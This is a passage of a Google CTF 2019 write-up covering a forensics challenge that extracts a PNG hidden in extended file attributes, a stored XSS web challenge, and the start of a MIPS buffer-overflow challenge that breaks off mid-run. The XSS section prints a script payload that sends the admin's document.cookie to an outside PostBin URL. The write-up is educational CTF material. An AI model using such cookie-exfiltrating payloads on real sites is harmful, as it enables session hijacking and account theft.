+&lt;&#x2F;span&gt;&lt;span&gt;├── Program Files (x86)
+&lt;&#x2F;span&gt;&lt;span&gt;├── Setup.log
+&lt;&#x2F;span&gt;&lt;span&gt;├── SSUUpdater.log
+&lt;&#x2F;span&gt;&lt;span&gt;├── swapfile.sys
+&lt;&#x2F;span&gt;&lt;span&gt;├── Users
+&lt;&#x2F;span&gt;&lt;span&gt;└── Windows
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This clearly looks like your average Windows &lt;code&gt;C:&#x2F;&lt;&#x2F;code&gt; directory partition. Let&#x27;s prod around a little in the file structure to find something interesting.&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: The Users directory contains all the documents and downloads by the user so that should always be checked first.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Looking around for a while, we find something interesting in &lt;code&gt;&#x2F;mnt&#x2F;Users&#x2F;Family&#x2F;Documents&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── credentials.txt
+&lt;&#x2F;span&gt;&lt;span&gt;├── document.pdf
+&lt;&#x2F;span&gt;&lt;span&gt;└── preview.pdf
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The output of &lt;code&gt;credentials.txt&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;I keep pictures of my credentials in extended attributes.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Alright, go and have a look at what &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Extended_file_attributes&quot;&gt;extended attributes&lt;&#x2F;a&gt;  are. &lt;&#x2F;p&gt;
+&lt;p&gt;Now, let&#x27;s use the &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;5&#x2F;attr&quot;&gt;attr&lt;&#x2F;a&gt; program to list out extended attributes of our &lt;code&gt;credentials.txt&lt;&#x2F;code&gt; file:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$attr -l credentials.txt
+&lt;&#x2F;span&gt;&lt;span&gt;Attribute &amp;quot;FILE0&amp;quot; has a 38202 byte value for credentials.txt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Okay let&#x27;s get the value of the key &lt;code&gt;FILE0&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$attr -g FILE0 credentials.txt
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This spills out a heck lot of strange characters, okay time to redirect all this output to a file:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$attr -g FILE0 credentials.txt &amp;gt; cred
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we need to find out what type of data this is  (although we have been given a clear hint in the &lt;code&gt;credentials.txt&lt;&#x2F;code&gt; file that this should be a picture, let&#x27;s be specific) and in order to do let&#x27;s use the following basic information:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;if it&#x27;s a specific file format, it will have a specific header or file signature (mostly it&#x27;s in the form of a specific header)&lt;&#x2F;li&gt;
+&lt;li&gt;if we can see the header of the file format, we can understand what type of file it is.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;Now taking into account these two things, let&#x27;s try to output first few bytes of our file &lt;code&gt;cred&lt;&#x2F;code&gt; with the aid of the &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;head&quot;&gt;head&lt;&#x2F;a&gt; and &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;linux.die.net&#x2F;man&#x2F;1&#x2F;hexdump&quot;&gt;hexdump&lt;&#x2F;a&gt; programs:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$cat cred | head -c 128 | hexdump -C
+&lt;&#x2F;span&gt;&lt;span&gt;00000000  41 74 74 72 69 62 75 74  65 20 22 46 49 4c 45 30  |Attribute &amp;quot;FILE0|
+&lt;&#x2F;span&gt;&lt;span&gt;00000010  22 20 68 61 64 20 61 20  33 38 32 30 32 20 62 79  |&amp;quot; had a 38202 by|
+&lt;&#x2F;span&gt;&lt;span&gt;00000020  74 65 20 76 61 6c 75 65  20 66 6f 72 20 63 72 65  |te value for cre|
+&lt;&#x2F;span&gt;&lt;span&gt;00000030  64 65 6e 74 69 61 6c 73  2e 74 78 74 3a 0a 89 50  |dentials.txt:..P|
+&lt;&#x2F;span&gt;&lt;span&gt;00000040  4e 47 0d 0a 1a 0a 00 00  00 0d 49 48 44 52 00 00  |NG........IHDR..|
+&lt;&#x2F;span&gt;&lt;span&gt;00000050  04 d2 00 00 01 53 08 02  00 00 00 73 b9 b6 5e 00  |.....S.....s..^.|
+&lt;&#x2F;span&gt;&lt;span&gt;00000060  00 00 03 73 42 49 54 08  08 08 db e1 4f e0 00 00  |...sBIT.....O...|
+&lt;&#x2F;span&gt;&lt;span&gt;00000070  00 19 74 45 58 74 53 6f  66 74 77 61 72 65 00 67  |..tEXtSoftware.g|
+&lt;&#x2F;span&gt;&lt;span&gt;00000080
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We can clearly see error message and after that a mention of &lt;code&gt;PNG&lt;&#x2F;code&gt;. Looking at the &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Portable_Network_Graphics&quot;&gt;PNG File Format&lt;&#x2F;a&gt;, we realise that this header is a bit off and needs to be edited to start with the regular 8-byte signature - &lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;So using any kind of hex editor just delete the message upto the byte &lt;code&gt;89&lt;&#x2F;code&gt; and save the file. Now since we know this is &lt;em&gt;.png&lt;&#x2F;em&gt; file, let&#x27;s open it with any image viewer:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;home_cred.png&quot; alt=&quot;Home_cred.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;And there we go, got our Flag!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Lesson Learned:&lt;&#x2F;strong&gt;  always remember to extract file signature when dealing with unknown files formats (&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;file-extension.net&#x2F;seeker&#x2F;&quot;&gt;Here&#x27;s a search tool&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;government-agricultural-network-web&quot;&gt;Government Agricultural Network - Web&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government.png&quot; alt=&quot;government.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Alright we go to the given url to find a textbox with which we can apparently create a new post:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government_site.png&quot; alt=&quot;government_site.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Trying some random text we and hitting the submit button we are led to this page:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government_post.png&quot; alt=&quot;government_post.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Also this inspecting the request in developer tools we can see it&#x27;s a &lt;code&gt;post&lt;&#x2F;code&gt; request:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government_method.png&quot; alt=&quot;government_method.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Nothing much to see except the message tells us the admin will review the post shortly. This means that we can send data to the &lt;code&gt;admin&lt;&#x2F;code&gt; through this method and it will be evaluated, seems like a perfect ground for a &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Cross-site_Scripting_(XSS)&quot;&gt;Cross Site Scripting (XSS) attack&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: https:&#x2F;&#x2F;www.owasp.org is an excellent resource to learn about various exploitation techniques!&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Okay let&#x27;s use the help of &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;postb.in&#x2F;&quot;&gt;PostBin&lt;&#x2F;a&gt; to get output of our payload and create a new bin:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government_bin.png&quot; alt=&quot;government_bin.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Now let&#x27;s create our payload to send to the &lt;code&gt;admin&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;script&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt; location.href = &amp;#39;https:&#x2F;&#x2F;postb.in&#x2F;1561983861427-6059538838453?cookie=&amp;#39;+document.cookie;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;script&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;When the &lt;code&gt;admin&lt;&#x2F;code&gt; reviews the post it gets directed to the bin of our choice with all the precious cookies that might contain some relevant information for us!&lt;&#x2F;p&gt;
+&lt;p&gt;After posting our payload, let&#x27;s see the output in our bin:
+&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;government_flag.png&quot; alt=&quot;government_flag.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Well, looks like we got our Flag in some tasty cookies!&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Lesson Learned:&lt;&#x2F;strong&gt; Always consult &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.owasp.org&#x2F;&quot;&gt;OWASP&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;stop-gan-pwn&quot;&gt;Stop GAN - Pwn&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;ctf_images&#x2F;google_2019&#x2F;stop_gan.png&quot; alt=&quot;stop_gan.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Again downloading and unzipping we have:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;├── 4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a
+&lt;&#x2F;span&gt;&lt;span&gt;├── bof
+&lt;&#x2F;span&gt;&lt;span&gt;└── console.c
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Let&#x27;s have a look at the binary first:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$.&#x2F;bof
+&lt;&#x2F;span&gt;&lt;span&gt;Cauliflower systems never crash &amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;a
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And we input &lt;code&gt;a&lt;&#x2F;code&gt; and it just cleanly exists. Okay there are a couple of hints: the never crash message, the filename &lt;code&gt;bof&lt;&#x2F;code&gt; as in buffer overflow so we have an idea that we need to overflow it.&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Tip: Always use checksec and file commands in a pwn challenge to understand the binary vulnerabilities present.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Taking cue, we run a quick &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;slimm609&#x2F;checksec.sh&quot;&gt;checksec&lt;&#x2F;a&gt; on the binary and we get:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$checksec -f .&#x2F;bof
+&lt;&#x2F;span&gt;&lt;span&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+&lt;&#x2F;span&gt;&lt;span&gt;No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   1817 Symbols     Yes    0               41      .&#x2F;bof
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Also let&#x27;s just run &lt;code&gt;file&lt;&#x2F;code&gt; to any more info:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$file bof
+&lt;&#x2F;span&gt;&lt;span&gt;bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]=a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we don&#x27;t have neither &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;ctf101.org&#x2F;binary-exploitation&#x2F;stack-canaries&#x2F;&quot;&gt;stack canary&lt;&#x2F;a&gt; nor &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;ctf101.org&#x2F;binary-exploitation&#x2F;no-execute&#x2F;&quot;&gt;NX&lt;&#x2F;a&gt; to deal with, so not much to worry about this seems like a simple buffer-overflow situation. One important thing to note is that elf is a mips executable and is little endian architecture. So we won&#x27;t be able to use our out of the box gdb for debugging purposes. &lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s take a look at the other c source code file now:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdio.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;stdlib.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;string.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;unistd.h&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * 6e: bufferflow triggering segfault  - binary, compile with:
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * gcc &#x2F;tmp&#x2F;console.c -o &#x2F;tmp&#x2F;console -static -s
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Console allows the player to get info on the binary.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Crashing bof will trigger the 1st flag.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Controlling the buffer overflow in bof will trigger the 2nd flag.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdin, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setbuf&lt;&#x2F;span&gt;&lt;span&gt;(stdout, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;setbuf&lt;&#x2F;span&gt;&lt;span&gt;(stderr, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; inputs[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;];
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &amp;#39;run&amp;#39; command.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; Bonus flag for controlling the crash.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Console commands: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;quit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(inputs, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;, stdin) == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Inputs: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, inputs);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(inputs, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n\0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;) == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; result = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;usr&#x2F;bin&#x2F;qemu-mipsel-static .&#x2F;bof&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;continue&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else if &lt;&#x2F;span&gt;&lt;span&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(inputs, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;quit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n\0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt;) == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Unable to determine action from your input&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Well by reading the comments in the program it&#x27;s clear what we need to do, let&#x27;s compile the program first and run it:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.&#x2F;console
+&lt;&#x2F;span&gt;&lt;span&gt;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &amp;#39;run&amp;#39; command.
+&lt;&#x2F;span&gt;&lt;span&gt; Bonus flag for controlling the crash.
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Console commands:
+&lt;&#x2F;span&gt;&lt;span&gt;run
+&lt;&#x2F;span&gt;&lt;span&gt;quit
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;run&lt;&#x2F;code&gt; command runs the &lt;code&gt;bof&lt;&#x2F;code&gt; binary and then expects us to overflow it.&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s try crashing the program by manually entering a lot of input and see what happens:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$.&#x2F;console
+&lt;&#x2F;span&gt;&lt;span&gt;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &amp;#39;run&amp;#39; command.
+&lt;&#x2F;span&gt;&lt;span&gt; Bonus flag for controlling the crash.
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;Console commands:
+&lt;&#x2F;span&gt;&lt;span&gt;run
+&lt;&#x2F;span&gt;&lt;span&gt;quit
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;gt;run
+&lt;&#x2F;span&gt;&lt;span&gt;Inputs: run
